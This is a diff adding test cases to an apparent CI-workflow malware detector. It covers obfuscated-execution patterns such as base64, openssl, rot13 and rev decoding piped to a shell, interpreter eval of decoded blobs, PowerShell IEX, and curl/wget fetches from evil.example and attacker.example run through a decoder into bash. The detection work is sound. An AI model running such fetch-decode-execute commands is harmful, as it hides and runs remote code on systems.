@@ -160,6 +160,224 @@ class TestBase64EncodedCredentialExfil:
 
 
 # ──────────────────────────────────────────────────────────────────
+# Extended base64 obfuscation: long-form decode flag, here-string,
+# openssl decoder, process substitution, curl-fetched encoded payload,
+# decompress chains, plus the dash / ash shell-name fixes.
+# ──────────────────────────────────────────────────────────────────
+
+
+_B64 = "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8="
+
+
+class TestBase64DecodeLongForm:
+    def test_long_decode_flag_to_bash(self) -> None:
+        blob = f"echo {_B64} | base64 --decode | bash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_bsd_uppercase_decode_flag(self) -> None:
+        blob = f"echo {_B64} | base64 -D | sh"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_decode_into_dash_shell(self) -> None:
+        # Previously ``dash`` was missed by the regex; widened
+        # shell alternation now catches it.
+        blob = f"echo {_B64} | base64 -d | dash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_decode_into_ash_shell(self) -> None:
+        # Alpine busybox ``ash`` is the default shell in Docker
+        # build steps that derive from ``alpine``; common attacker
+        # target.
+        blob = f"echo {_B64} | base64 -d | ash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+
+class TestBase64HereString:
+    def test_here_string_decoded_to_shell(self) -> None:
+        blob = f'base64 -d <<< "{_B64}" | bash'
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_here_string_long_decode_flag(self) -> None:
+        blob = f'base64 --decode <<< "{_B64}" | sh'
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+
+class TestOpenSSLBase64Decoder:
+    def test_openssl_base64_d(self) -> None:
+        blob = f"echo {_B64} | openssl base64 -d | bash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_openssl_enc_base64_d(self) -> None:
+        blob = f"echo {_B64} | openssl enc -base64 -d | sh"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_openssl_short_a_flag(self) -> None:
+        # ``openssl enc -a -d`` is the short form of ``-base64 -d``.
+        blob = f"echo {_B64} | openssl enc -a -d -A | bash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+
+class TestProcessSubstitutionDecoded:
+    def test_bash_process_sub_with_decode(self) -> None:
+        blob = f'bash <(echo {_B64} | base64 -d)'
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_source_process_sub_with_curl_decode(self) -> None:
+        blob = "source <(curl -sL http://attacker.example/p | base64 -d)"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_dot_alias_process_sub(self) -> None:
+        # POSIX ``.`` (dot) is the portable equivalent of ``source``.
+        blob = ". <(echo VEVTVA== | base64 --decode)"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+
+class TestCurlFetchedEncodedPayload:
+    def test_curl_to_b64_to_bash(self) -> None:
+        blob = "curl -sL http://evil.example/payload | base64 -d | bash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_wget_qOdash_to_b64_to_sh(self) -> None:
+        blob = "wget -qO- http://evil.example/payload | base64 -d | sh"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_does_not_fire_on_plain_curl_pipe(self) -> None:
+        # ``curl | bash`` without an encoded layer is GHA-016's
+        # surface, not GHA-027's. The malicious-pack should not
+        # claim it here.
+        blob = "curl -sL https://get.docker.com | bash"
+        hits = find_malicious_patterns(blob)
+        assert all(
+            "curl-fetched encoded" not in n for _c, n, _e in hits
+        )
+
+
+class TestDecodeDecompressChain:
+    def test_b64_gunzip_bash(self) -> None:
+        blob = f"echo {_B64} | base64 -d | gunzip | bash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_b64_gzip_d_sh(self) -> None:
+        blob = f"echo {_B64} | base64 -d | gzip -d | sh"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_b64_zcat_bash(self) -> None:
+        blob = f"echo {_B64} | base64 --decode | zcat | bash"
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+
+class TestTrAndRevDecoding:
+    def test_tr_rot13_to_shell(self) -> None:
+        blob = (
+            "echo 'cnzpcyB6Z3R0NDU0NDQ=' | "
+            "tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_rev_to_shell(self) -> None:
+        blob = 'echo "hsab- i- hsab" | rev | bash'
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_does_not_fire_on_benign_rev(self) -> None:
+        # ``rev`` used for log presentation, no shell sink.
+        blob = 'echo "$line" | rev > rotated.txt'
+        hits = find_malicious_patterns(blob)
+        assert all("rev-decoded" not in n for _c, n, _e in hits)
+
+
+class TestInterpreterB64Eval:
+    def test_python_base64_b64decode_exec(self) -> None:
+        blob = (
+            "python -c 'import base64;"
+            f'exec(base64.b64decode("{_B64}"))\''
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_python3_codecs_base64_eval(self) -> None:
+        blob = (
+            "python3 -c \"import codecs;"
+            f"eval(codecs.decode('{_B64}', 'base64'))\""
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_node_buffer_from_base64_eval(self) -> None:
+        blob = (
+            "node -e 'eval(Buffer.from(\""
+            f"{_B64}\", \"base64\").toString())'"
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_node_function_constructor_base64(self) -> None:
+        # ``Function(string)()`` is a common ``eval`` substitute.
+        blob = (
+            "node -e 'Function(Buffer.from(\""
+            f"{_B64}\", \"base64\").toString())()'"
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_perl_decode_base64_eval(self) -> None:
+        blob = (
+            "perl -MMIME::Base64 -e '"
+            f'eval(decode_base64("{_B64}"))\''
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_does_not_fire_on_python_base64_alone(self) -> None:
+        # base64 round-trip without an exec/eval sink is benign
+        # (build-time asset encoding).
+        blob = (
+            "python -c 'import base64;"
+            "print(base64.b64encode(open(\"asset.bin\",\"rb\").read()))'"
+        )
+        hits = find_malicious_patterns(blob)
+        assert all(
+            "python b64decode" not in n for _c, n, _e in hits
+        )
+
+
+class TestPowerShellFromBase64String:
+    def test_iex_frombase64string(self) -> None:
+        blob = (
+            'IEX ([System.Text.Encoding]::ASCII.GetString('
+            f'[Convert]::FromBase64String("{_B64}")))'
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+    def test_invoke_expression_alias(self) -> None:
+        blob = (
+            "Invoke-Expression ([Text.Encoding]::UTF8.GetString("
+            f'[System.Convert]::FromBase64String("{_B64}")))'
+        )
+        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
+        assert "obfuscated-exec" in cats
+
+
+# ──────────────────────────────────────────────────────────────────
 # Suppression: example/fixture/docs context must not hide a real hit
 # in production code, but must hide a literal mention inside an
 # obvious example block.
